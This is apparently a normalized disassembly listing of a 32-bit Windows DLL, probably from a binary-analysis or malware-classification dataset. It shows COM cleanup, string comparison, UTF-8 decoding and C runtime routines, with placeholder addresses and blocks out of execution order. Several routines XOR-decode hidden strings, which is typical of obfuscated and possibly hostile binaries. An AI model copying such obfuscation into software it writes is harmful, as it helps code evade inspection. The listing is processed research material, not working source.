cmp eax esi
je r-xdata
xor ecx ecx
mov ecx [ ecx ]
jmp r-xdata
mov eax [ edi + 0x4 ]
cmp eax esi
je r-xdata
push eax
call [ SysFreeString@IAT ]
xor edx edx
mov edx [ eax ]
jmp r-xdata
mov eax [ eax ]
cmp eax esi
je r-xdata
push edi
call sub_10065045
add esp 0x4
push eax
call sub_1005b4d5
add esp 0x4
lea edx [ ebp - 0x58 ]
mov eax 0x15
call sub_10036cd0
mov eax [ ebp - 0xd0 ]
cmp eax esi
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x6
jmp r-xdata
mov eax [ ebp - 0xcc ]
mov edi [ eax ]
lea ebx [ ebp - 0xd0 ]
push ebx
push esi
push 0x30
push ecx
push edx
mov edx [ edi + 0x50 ]
push eax
call edx
lea edi [ ebp - 0xd8 ]
mov ebx eax
call sub_10005b80
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10005b80
cmp ebx esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
xor eax eax
mov ebx 0x8
jmp r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0xe8 ]
push edx
lea edx [ ebp - 0xdc ]
push edx
push 0x1
push 0xffffffff
push eax
mov eax [ ecx + 0x10 ]
call eax
mov eax [ ebp - 0xd0 ]
cmp [ ebp - 0xe8 ] esi
je r-xdata
cmp eax esi
je r-xdata
mov eax [ ebp - 0xdc ]
mov ecx [ eax ]
push esi
push esi
lea edx [ ebp - 0xfc ]
push edx
push esi
lea edx [ ebp - 0x58 ]
push edx
push eax
mov eax [ ecx + 0x10 ]
call eax
mov edx [ ebp - 0xf4 ]
xor ecx ecx
mov eax edx
mov [ ebp - 0x20 ] 0x7
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x34 ] cx
lea edi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x34 ]
call sub_1005e3c0
mov edi [ ebp - 0xe4 ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x3
call sub_1002ba80
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x20 ] ebx
jb r-xdata
lea ecx [ ebp - 0xfc ]
xor eax eax
push ecx
mov [ ebp - 0x20 ] 0x7
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x34 ] ax
call [ VariantClear@IAT ]
mov eax [ ebp - 0xdc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0xd0 ]
cmp eax esi
jne r-xdata
mov edx [ ebp - 0x34 ]
push edx
call sub_10065045
add esp 0x4
sub_100640c0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffab
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xc
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x5c ]
push edx
mov ecx esi
call sub_1005e3c0
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_1005e510
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100641b2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jle r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_100408c4
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push eax
push [ ebp + 0x18 ]
call sub_100408c4
pop ecx
pop ecx
mov ecx esi
sub ecx eax
jne r-xdata
test eax eax
je r-xdata
xor eax eax
test ecx ecx
setns al
lea eax [ eax + eax + 0x1 ]
push 0x2
pop eax
jmp r-xdata
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
sub_10064220
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x3c ] 0x8
push edi
jb r-xdata
xor ecx ecx
mov [ esi + 0x3c ] 0x7
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x28 ] cx
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov eax [ esi + 0x28 ]
push eax
call sub_10065045
add esp 0x4
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] 0x0
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov edx [ esi + 0xc ]
push edx
call sub_10065045
add esp 0x4
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100067d1
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_1002470e
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_100642c0
push ebp
mov ebp esp
push 0xffffffff
push sub_100810ac
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi ] r--data
mov edx [ edi ]
lea ecx [ esi + 0xc ]
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx ] ax
mov eax edx
lea ebx [ eax + 0x2 ]
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x88 ] ebx
lea ebx [ ebx ]
mov bx [ eax ]
add eax 0x2
test bx bx
jne r-xdata
sub eax [ ebp - 0x88 ]
sar eax 0x1
push eax
push edx
call sub_1005e3c0
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ edi + 0x20 ]
mov [ esi + 0x28 ] eax
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] edx
mov [ esi + 0x2c ] cx
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x4c ] edx
mov eax [ edi + 0x2c ]
mov [ esi + 0x50 ] eax
mov ecx [ edi + 0x28 ]
mov [ esi + 0x54 ] ecx
mov eax [ edi + 0x24 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x4c ]
mov [ esi + 0x5c ] ecx
mov eax [ edi + 0x48 ]
mov [ esi + 0x60 ] eax
mov ecx [ r--data ]
xor eax eax
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0x77
and ebx 0xff
mov [ ebp + eax * 2 - 0x50 ] bx
inc eax
cmp eax 0x8
jb r-xdata
xor ecx ecx
mov [ ebp - 0x40 ] cx
mov ecx [ r--data ]
xor eax eax
lea ebx [ ebx ]
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0x5d
and ebx 0xff
mov [ ebp + eax * 2 - 0x84 ] bx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6c ] ax
lea esp [ esp ]
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xffa4
and ebx 0xff
mov [ ebp + eax * 2 - 0x2c ] bx
inc eax
cmp eax 0x7
jb r-xdata
xor ecx ecx
mov [ ebp - 0x1e ] cx
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0x4b
and ebx 0xff
mov [ ebp + eax * 2 - 0x3c ] bx
inc eax
cmp eax 0x7
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x2e ] ax
jmp r-xdata
movsx ebx [ ecx + eax ]
xor ebx eax
xor ebx 0xfff6
and ebx 0xff
mov [ ebp + eax * 2 - 0x1c ] bx
inc eax
cmp eax 0x5
jb r-xdata
xor ecx ecx
mov [ ebp - 0x12 ] cx
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x4a
and edx 0xff
mov [ ebp + eax * 2 - 0x68 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ebx [ lstrcmpW@IAT ]
xor eax eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x54 ] ax
mov eax [ edi + 0x1c ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x3c ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x1
jmp r-xdata
mov eax [ edi + 0x1c ]
lea ecx [ ebp - 0x84 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x2
jmp r-xdata
mov edx [ edi + 0x8 ]
mov eax edx
lea ebx [ eax + 0x2 ]
jmp r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x50 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x3
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov eax [ edi + 0x1c ]
lea ecx [ ebp - 0x1c ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x4
jmp r-xdata
sub eax ebx
sar eax 0x1
push eax
push edx
lea ecx [ esi + 0x2c ]
call sub_1005e3c0
mov eax [ edi + 0x40 ]
mov [ esi + 0x68 ] eax
mov ecx [ edi + 0x44 ]
mov [ esi + 0x6c ] ecx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x68 ]
push edx
push eax
call ebx
neg eax
sbb eax eax
and eax 0xfffffffa
add eax 0x6
mov [ esi + 0x48 ] eax
mov [ esi + 0x48 ] 0x5
jmp r-xdata
sub_10064580
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ edi ] eax
mov [ edx ] ecx
cmp [ edi ] ebx
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
cmp edx [ edi ]
pop edi
pop esi
sete al
pop ebx
pop ebp
retn 0x1c
mov eax [ ebp + 0x1c ]
cmp [ edx ] eax
je r-xdata
mov esi [ edi ]
mov cl [ esi ]
cmp cl 0x80
jae r-xdata
cmp cl 0xc0
jb r-xdata
inc esi
movzx eax cl
mov [ edi ] esi
jmp r-xdata
inc [ edi ]
movzx eax cl
cmp cl 0xe0
jae r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0x0
jne r-xdata
cmp cl 0xf0
jae r-xdata
and eax 0x1f
mov ecx 0x1
cmp eax 0x10ffff
ja r-xdata
mov [ ecx ] 0x1
cmp cl 0xf8
jae r-xdata
and eax 0xf
mov ecx 0x2
jmp r-xdata
inc esi
mov [ edi ] esi
test ecx ecx
jle r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x1c
mov ecx [ edx ]
mov ebx [ ebp + 0x10 ]
mov [ ecx ] ax
add [ edx ] 0x2
cmp [ edi ] ebx
jne r-xdata
and eax 0x3
cmp cl 0xfc
sbb ecx ecx
add ecx 0x5
jne r-xdata
and eax 0x7
mov ecx 0x3
jmp r-xdata
sub ebx esi
lea edx [ ecx + 0x1 ]
cmp ebx edx
jl r-xdata
mov edx [ ebp + 0x20 ]
jmp r-xdata
inc esi
mov [ edi ] esi
jmp r-xdata
mov dl [ esi ]
lea ebx [ edx + 0x80 ]
cmp bl 0x3f
ja r-xdata
movzx edx dl
and edx 0x3f
shl eax 0x6
dec ecx
inc esi
or eax edx
mov [ edi ] esi
test ecx ecx
jg r-xdata
sub_100646a0
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
mov ecx [ r--data ]
xor edi edi
xor eax eax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffac
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x6c ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x6c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov esi [ ebp - 0x6c ]
call sub_10009820
mov esi eax
mov eax [ ebp - 0x6c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp esi edi
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0xdf
mov esi 0x1
call sub_1000a6f0
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x68 ]
push edx
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x68 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0xdf
call sub_1000a6f0
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov esi [ ebx + 0x128 ]
cmp esi edi
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x68 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
jmp r-xdata
mov edi [ esi ]
lea ecx [ ebp - 0x68 ]
push ecx
call sub_10005e80
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_100647d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081011
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x4
mov [ edi + 0x10 ] eax
mov ecx 0x7
mov [ edi + 0x14 ] ecx
xor edx edx
mov [ edi ] dx
mov [ edi + 0x30 ] ecx
mov [ edi + 0x2c ] eax
mov [ edi + 0x1c ] dx
mov [ edi + 0x50 ] ecx
mov [ edi + 0x4c ] eax
mov [ edi + 0x3c ] dx
mov [ edi + 0x6c ] ecx
mov [ edi + 0x68 ] eax
mov [ edi + 0x58 ] ax
cmp [ ebp + 0x1c ] 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] 0x1
jae r-xdata
mov ecx [ ebp + 0x18 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10057df0
add esp 0x4
push eax
lea ecx [ edi + 0x1c ]
mov [ ebp - 0x4 ] 0x5
call sub_10051390
mov ebx 0x8
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x8 ]
mov eax [ ebp + 0x5c ]
mov esi 0x10
cmp [ ebp + 0x70 ] esi
jae r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
push eax
call [ StrToIntA@IAT ]
mov [ edi + 0x38 ] ax
mov eax [ ebp + 0x24 ]
cmp [ ebp + 0x38 ] esi
jae r-xdata
lea eax [ ebp + 0x5c ]
mov ecx [ ebp + 0x34 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10057df0
add esp 0x4
push eax
lea ecx [ edi + 0x3c ]
mov [ ebp - 0x4 ] 0x6
call sub_10051390
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x24 ]
cmp [ ebp + 0x54 ] 0x10
mov eax [ ebp + 0x40 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp + 0x50 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10057df0
add esp 0x4
push eax
lea ecx [ edi + 0x58 ]
mov [ ebp - 0x4 ] 0x7
call sub_10051390
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x40 ]
cmp [ ebp + 0x1c ] 0x10
mov ecx [ ebp + 0x78 ]
mov [ edi + 0x78 ] ecx
mov [ edi + 0x7c ] 0x1
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
xor esi esi
cmp [ ebp + 0x38 ] 0x10
mov ebx 0xf
mov [ ebp + 0x1c ] ebx
mov [ ebp + 0x18 ] esi
mov [ ebp + 0x8 ] 0x0
jb r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_10065045
add esp 0x4
cmp [ ebp + 0x54 ] 0x10
mov [ ebp + 0x38 ] ebx
mov [ ebp + 0x34 ] esi
mov [ ebp + 0x24 ] 0x0
jb r-xdata
mov eax [ ebp + 0x24 ]
push eax
call sub_10065045
add esp 0x4
cmp [ ebp + 0x70 ] 0x10
mov [ ebp + 0x54 ] ebx
mov [ ebp + 0x50 ] esi
mov [ ebp + 0x40 ] 0x0
jb r-xdata
mov ecx [ ebp + 0x40 ]
push ecx
call sub_10065045
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x5c ]
push edx
call sub_10065045
add esp 0x4
sub_100649a7
mov edi edi
push ebp
mov ebp esp
push esi
call sub_100435f4
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_10064af1
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_1003a25a
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10064b18
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000978f
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10064bb5
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_1002f22b
pop ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_1003feb0
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_10064bde
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1002e0d0
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10064c8e
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_10064cd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080141
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x3c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
add edi 0x3c
jmp r-xdata
mov eax [ edi ]
push 0xffffffff
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
push ebx
lea edx [ edi + 0x4 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] bl
call sub_100146b0
mov eax [ edi + 0x20 ]
mov [ esi + 0x20 ] eax
mov ecx [ edi + 0x24 ]
mov [ esi + 0x24 ] ecx
mov edx [ edi + 0x28 ]
mov [ esi + 0x28 ] edx
mov eax [ edi + 0x2c ]
mov [ esi + 0x2c ] eax
mov ecx [ edi + 0x30 ]
mov [ esi + 0x30 ] ecx
mov edx [ edi + 0x34 ]
mov [ esi + 0x34 ] edx
mov al [ edi + 0x38 ]
mov [ esi + 0x38 ] al
sub_10064d7b
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1002050e
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1002efc0
add esi 0x3c
cmp esi edi
jne r-xdata
sub_10064dae
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x7ffffffe
jbe r-xdata
mov eax [ ecx + 0x14 ]
cmp eax esi
jae r-xdata
push r--data
call sub_100616c6
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ecx + 0x10 ]
push esi
call sub_100590e1
jmp r-xdata
test esi esi
jne r-xdata
cmp esi 0x8
jae r-xdata
xor eax eax
cmp eax esi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
and [ ecx + 0x10 ] esi
cmp eax 0x8
jb r-xdata
mov eax [ ecx + 0x10 ]
cmp esi eax
jae r-xdata
xor eax eax
mov [ ecx ] ax
mov ecx [ ecx ]
push eax
push 0x1
call sub_1004dbe5
jmp r-xdata
mov eax esi
sub_10064e20
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fc59
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ eax + 0x10 ]
mov ecx [ ecx + 0x10 ]
mov edi [ esi + 0x10 ]
add eax ecx
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_10040f60
mov eax [ ebp + 0x10 ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_10040f60
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10016ae0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_10064eda
push 0x28
mov eax sub_1007ef3b
call sub_10050d0f
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
